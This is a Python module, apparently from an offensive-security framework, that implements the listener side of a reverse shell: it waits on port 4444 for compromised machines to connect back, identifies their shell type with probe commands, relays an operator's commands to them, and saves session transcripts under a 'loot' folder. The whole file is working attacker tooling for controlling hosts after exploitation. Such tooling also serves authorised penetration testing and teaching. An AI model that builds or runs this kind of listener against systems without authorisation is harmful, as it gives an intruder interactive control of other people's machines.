"""
Reverse-shell listener and interactive session handler.

This module is the "catch" side of a reverse shell. You start a
listener, the target connects back (via a payload from
payload/shells.py or an exploit chain in vuln/), and this module
turns the raw TCP socket into an interactive session you can type
commands into.

Scope (Session 6):

  - TCP listener on a configurable host:port
  - One session at a time (Session 7 adds multi-session switching)
  - Shell type detection (bash, sh, cmd.exe, PowerShell, python, nc)
  - Interactive prompt: type a command, see the output
  - Transcript logging to disk (workspace/loot/shells/)
  - Session row in the store (via core.store.open_shell)
  - Clean exit on "exit", Ctrl-D, or Ctrl-C

Out of scope (Session 7 and later):

  - File transfer (upload/download)
  - PTY upgrade for full-terminal shells
  - Multi-session handling with switching
  - Signal forwarding (Ctrl-C, Ctrl-Z to the target)

Design notes:

  - Input is blocking readline via input(). This works on Windows
    PowerShell and Linux uniformly. Session 7 may add aioconsole
    for history and arrow keys.
  - The socket is read with a short timeout in the prompt loop so
    that Ctrl-C is responsive and we can flush any pending output
    after each command. A background reader thread was considered
    and rejected because it interleaves badly with input() on
    Windows.
  - Shell type detection uses a sentinel echo: we send a unique
    string, read whatever comes back, and pattern-match. If that
    fails, we fall back to "unknown" and let the operator tag it
    with --tag.
"""

import asyncio
import os
import re
import secrets
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

from core.output import info, success, warn, error


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444

# How long to wait after sending the detection sentinel before we
# give up and move on. Shells over a WAN link can be slow.
DETECT_TIMEOUT = 3.0

# How long to wait for socket reads inside the prompt loop. Short
# enough to stay responsive to Ctrl-C, long enough to not busy-loop.
READ_TIMEOUT = 0.25

# Max bytes we'll show from a single read. A shell printing a huge
# directory listing shouldn't flood the terminal; we cap it and
# add a marker.
MAX_CHUNK = 65536


# ---------------------------------------------------------------------
# Shell type detection
# ---------------------------------------------------------------------

# Sentinel we echo through the shell to see what interpreter
# responds. The label is random so it can't collide with any real
# output.
def _make_sentinel():
    return "tk_" + secrets.token_hex(6)


async def _detect_shell_type(reader, writer, verbose=False):
    """Send a probe command and inspect the response.

    The shell may be a raw /bin/sh, bash, cmd.exe, PowerShell, or
    just a netcat connected to something else. We try a few probes
    in order of specificity and return the first that matches.

    Returns one of: "bash", "sh", "cmd", "powershell", "python",
    "nc", "unknown".
    """
    sentinel = _make_sentinel()

    # Probe 1: whoami. This command exists on every OS and its
    # output shape tells us a lot. On Windows cmd we'll see
    # "DOMAIN\\user". On Linux we'll see a plain username.
    probe_cmds = [
        (b"echo " + sentinel.encode() + b"\r\n", "echo"),
        (b"whoami\r\n", "whoami"),
    ]

    collected = b""
    for cmd, _label in probe_cmds:
        try:
            writer.write(cmd)
            await writer.drain()
        except Exception:
            break

        # Read whatever arrives in the next ~600ms
        deadline = time.monotonic() + 0.6
        while time.monotonic() < deadline:
            try:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=0.2)
            except asyncio.TimeoutError:
                continue
            except Exception:
                break
            if not chunk:
                break
            collected += chunk
            # Small pause to allow the rest of the output to arrive
            await asyncio.sleep(0.15)
            if len(collected) > 0:
                # We got something; stop early
                break

        if collected:
            break

    low = collected.lower()

    if verbose:
        info(f"  detect: collected {len(collected)}B: "
             f"{collected[:120]!r}")

    # Match the collected output against known patterns.

    # PowerShell: has "PS " prompt or "Windows PowerShell" banner
    if b"ps " in low or b"windows powershell" in low:
        return "powershell"

    # cmd.exe: "Microsoft Windows [Version" banner, or C:\ in output
    if b"microsoft windows" in low or re.search(rb"[a-z]:\\\\", low):
        return "cmd"

    # Python interactive: ">>> " prompt
    if b">>> " in low:
        return "python"

    # bash: "bash-" version banner, or " bash" in output
    if b"bash-" in low or b"bash" in low:
        return "bash"

    # Generic sh: only if we got command output that looks like text
    if collected.strip():
        return "sh"

    return "unknown"


# ---------------------------------------------------------------------
# Session
# ---------------------------------------------------------------------

class Session:
    """One reverse-shell session."""

    def __init__(self, session_id, reader, writer,
                 listen_host, listen_port,
                 store=None, workspace=None,
                 shell_type=None):
        self.id = session_id
        self.reader = reader
        self.writer = writer
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.store = store
        self.workspace = workspace
        self.shell_type = shell_type or "unknown"

        # Peer info
        peer = writer.get_extra_info("peername")
        if peer and len(peer) >= 2:
            self.remote_host = peer[0]
            self.remote_port = peer[1]
        else:
            self.remote_host = "?"
            self.remote_port = 0

        # Byte counters
        self.bytes_sent = 0
        self.bytes_received = 0

        # Timing
        self.opened_at = time.time()
        self.closed_at = None

        # Transcript
        self.transcript_path = None
        self._transcript_fh = None

        # Store row id (set on open)
        self.store_id = None

    # -- transcript ----------------------------------------------------

    def _open_transcript(self):
        """Open the transcript file for writing. Path is under the
        workspace loot/shells/ directory if a workspace was provided,
        otherwise the current working directory."""
        if self.workspace is not None:
            base = self.workspace.shells_dir
        else:
            base = Path("loot") / "shells"
        base.mkdir(parents=True, exist_ok=True)

        ts = datetime.now(timezone.utc).strftime("%Y-%m-%d_%H%M%S")
        safe_host = self.remote_host.replace(":", "_").replace("/", "_")
        fname = f"{ts}_{safe_host}_{self.listen_port}.log"
        self.transcript_path = base / fname

        try:
            self._transcript_fh = self.transcript_path.open(
                "a", encoding="utf-8", errors="replace")
        except Exception as e:
            warn(f"  could not open transcript: {e}")
            self._transcript_fh = None

    def _log(self, direction, data):
        """Write a line to the transcript. direction is '<' or '>'."""
        if not self._transcript_fh:
            return
        try:
            ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
            text = data.decode("utf-8", errors="replace") \
                if isinstance(data, bytes) else str(data)
            for line in text.splitlines():
                self._transcript_fh.write(f"[{ts}] {direction} {line}\n")
            self._transcript_fh.flush()
        except Exception:
            pass

    def _close_transcript(self):
        if self._transcript_fh:
            try:
                self._transcript_fh.close()
            except Exception:
                pass
            self._transcript_fh = None

    # -- store ---------------------------------------------------------

    def register(self):
        """Insert this session into the store."""
        if self.store is None:
            return
        try:
            rel_path = None
            if self.transcript_path is not None:
                if self.workspace is not None:
                    try:
                        rel_path = str(self.transcript_path.relative_to(
                            self.workspace.path))
                    except Exception:
                        rel_path = str(self.transcript_path)
                else:
                    rel_path = str(self.transcript_path)

            self.store_id = self.store.open_shell(
                listen_host=self.listen_host,
                listen_port=self.listen_port,
                remote_host=self.remote_host,
                remote_port=self.remote_port,
                shell_type=self.shell_type,
                transcript_path=rel_path,
            )
        except Exception as e:
            warn(f"  could not register session in store: {e}")

    def unregister(self):
        """Mark the session as closed in the store."""
        if self.store is None or self.store_id is None:
            return
        try:
            self.store.close_shell(
                self.store_id,
                bytes_sent=self.bytes_sent,
                bytes_received=self.bytes_received,
            )
        except Exception as e:
            warn(f"  could not close session in store: {e}")

    # -- I/O -----------------------------------------------------------

    async def send_line(self, line: str):
        """Send one line to the shell. Adds CRLF for Windows friendliness
        — bash ignores the extra CR."""
        data = line.encode("utf-8", errors="replace") + b"\r\n"
        try:
            self.writer.write(data)
            await self.writer.drain()
            self.bytes_sent += len(data)
            self._log(">", data)
        except Exception as e:
            warn(f"  send failed: {e}")
            raise

    async def drain_output(self, quiet_after=0.6):
        """Read whatever the shell has to say, print it, log it.

        Reads until either the socket closes or we've been quiet
        for `quiet_after` seconds. This gives the shell time to
        finish producing output before we hand control back to the
        prompt.
        """
        last_data = time.monotonic()
        while True:
            try:
                chunk = await asyncio.wait_for(
                    self.reader.read(MAX_CHUNK), timeout=READ_TIMEOUT)
            except asyncio.TimeoutError:
                if time.monotonic() - last_data >= quiet_after:
                    return
                continue
            except Exception:
                return

            if not chunk:
                # Connection closed by peer
                raise ConnectionResetError("shell closed")

            self.bytes_received += len(chunk)
            self._log("<", chunk)

            text = chunk.decode("utf-8", errors="replace")
            sys.stdout.write(text)
            sys.stdout.flush()
            last_data = time.monotonic()

    # -- lifecycle -----------------------------------------------------

    def elapsed(self):
        end = self.closed_at if self.closed_at else time.time()
        return end - self.opened_at

    def close(self):
        self.closed_at = time.time()
        self._close_transcript()
        try:
            self.writer.close()
        except Exception:
            pass


# ---------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------

async def _handle_one_connection(session_id, reader, writer,
                                   listen_host, listen_port,
                                   store, workspace,
                                   shell_type_override,
                                   verbose):
    """Wrap one accepted connection in a Session and run its prompt
    loop until the shell closes or the operator types 'exit'."""
    session = Session(
        session_id, reader, writer,
        listen_host, listen_port,
        store=store, workspace=workspace,
        shell_type=shell_type_override,
    )

    # Try to auto-detect the shell type if not overridden.
    if session.shell_type in (None, "", "unknown"):
        detected = await _detect_shell_type(reader, writer,
                                              verbose=verbose)
        session.shell_type = detected

    session._open_transcript()
    session.register()

    peer = f"{session.remote_host}:{session.remote_port}"
    success(f"shell #{session.id} connected from {peer}")
    info(f"  type: {session.shell_type}")
    if session.transcript_path:
        info(f"  transcript: {session.transcript_path}")
    print()

    try:
        await _prompt_loop(session, verbose=verbose)
    except ConnectionResetError:
        info(f"  shell #{session.id} closed by peer")
    except KeyboardInterrupt:
        info(f"  shell #{session.id} interrupted locally")
    finally:
        session.close()
        session.unregister()
        elapsed = session.elapsed()
        info(f"shell #{session.id} closed "
             f"(sent {session.bytes_sent}B, "
             f"recv {session.bytes_received}B, "
             f"{elapsed:.1f}s)")


async def _prompt_loop(session, verbose=False):
    """Interactive prompt. Blocking input() runs in a thread so the
    event loop stays responsive to socket reads and Ctrl-C."""
    loop = asyncio.get_running_loop()

    # Prompt string depends on shell type.
    if session.shell_type == "cmd":
        prompt_str = f"cmd[{session.id}]> "
    elif session.shell_type == "powershell":
        prompt_str = f"ps[{session.id}]> "
    else:
        prompt_str = f"shell[{session.id}] $ "

    while True:
        # Read a line from the operator without blocking the event
        # loop. We use run_in_executor to shove input() onto a
        # thread; the event loop keeps pumping socket reads.
        try:
            line = await loop.run_in_executor(None, input, prompt_str)
        except EOFError:
            # Ctrl-D
            await session.send_line("exit")
            return
        except KeyboardInterrupt:
            # Ctrl-C at the prompt: send a newline to the target
            # to (best-effort) interrupt the running command.
            info("")
            info("  (Ctrl-C: sending empty line; use 'exit' to close)")
            continue

        if line is None:
            continue

        cmd = line.rstrip("\r\n")

        # Local exit
        if cmd.strip().lower() in ("exit", "quit", ".exit"):
            await session.send_line("exit")
            # Give the shell a moment to close
            try:
                await session.drain_output(quiet_after=0.5)
            except Exception:
                pass
            return

        # Local help
        if cmd.strip() == "!help":
            info("")
            info("  Session 6 commands:")
            info("    exit / quit / .exit  — close this session")
            info("    !help                — this message")
            info("    !info                — session metadata")
            info("  Everything else is sent to the remote shell.")
            info("")
            continue

        if cmd.strip() == "!info":
            info("")
            info(f"  id:       {session.id}")
            info(f"  remote:   {session.remote_host}:{session.remote_port}")
            info(f"  type:     {session.shell_type}")
            info(f"  sent:     {session.bytes_sent} B")
            info(f"  recv:     {session.bytes_received} B")
            info(f"  elapsed:  {session.elapsed():.1f}s")
            if session.transcript_path:
                info(f"  transcript: {session.transcript_path}")
            info("")
            continue

        # Empty line: just send it (target shells often re-prompt)
        if not cmd:
            try:
                await session.send_line("")
            except Exception:
                return
            continue

        # Send and read back.
        try:
            await session.send_line(cmd)
            await session.drain_output(quiet_after=0.8)
        except ConnectionResetError:
            return


async def listen(host=DEFAULT_HOST, port=DEFAULT_PORT,
                  store=None, workspace=None,
                  shell_type=None, verbose=False,
                  once=False):
    """Start the listener. Accepts connections until Ctrl-C or, if
    `once=True`, until the first session closes.

    store and workspace are optional. If provided, each session is
    recorded in the store and its transcript is written under the
    workspace's loot/shells/ directory.
    """
    server = await asyncio.start_server(
        lambda r, w: _handle_connection(
            r, w, host, port, store, workspace,
            shell_type, verbose),
        host=host, port=port)

    addrs = ", ".join(str(s.getsockname()) for s in server.sockets)
    info(f"shell listener on {addrs}")
    info("waiting for connections... (Ctrl-C to stop)")
    print()

    async with server:
        try:
            await server.serve_forever()
        except asyncio.CancelledError:
            pass
        finally:
            server.close()
            await server.wait_closed()


# ---------------------------------------------------------------------
# Connection counter
# ---------------------------------------------------------------------

# Module-level counter so each session gets a stable id. We increment
# under a threading lock because asyncio.start_server's callback can
# be invoked from a fresh task each time and we want deterministic ids.
_session_counter = 0
_session_lock = threading.Lock()


def _next_session_id():
    global _session_counter
    with _session_lock:
        _session_counter += 1
        return _session_counter


async def _handle_connection(reader, writer,
                              listen_host, listen_port,
                              store, workspace, shell_type_override,
                              verbose):
    sid = _next_session_id()
    try:
        await _handle_one_connection(
            sid, reader, writer,
            listen_host, listen_port,
            store, workspace, shell_type_override, verbose)
    except Exception as e:
        error(f"  session handler crashed: "
              f"{type(e).__name__}: {e}")
    finally:
        try:
            writer.close()
        except Exception:
            pass


# ---------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------

def _cli():
    import argparse
    p = argparse.ArgumentParser(
        prog="core.shell_handler",
        description="Reverse shell listener.",
    )
    p.add_argument("--listen", type=int, default=DEFAULT_PORT,
                   help=f"port to listen on (default {DEFAULT_PORT})")
    p.add_argument("--host", default=DEFAULT_HOST,
                   help=f"host to bind (default {DEFAULT_HOST})")
    p.add_argument("--tag", default=None,
                   help="skip detection and assume this shell type "
                        "(bash, sh, cmd, powershell, python, nc)")
    p.add_argument("-v", "--verbose", action="store_true")
    args = p.parse_args()

    asyncio.run(listen(
        host=args.host, port=args.listen,
        shell_type=args.tag, verbose=args.verbose))


if __name__ == "__main__":
    try:
        _cli()
    except KeyboardInterrupt:
        print("\n[!] stopped")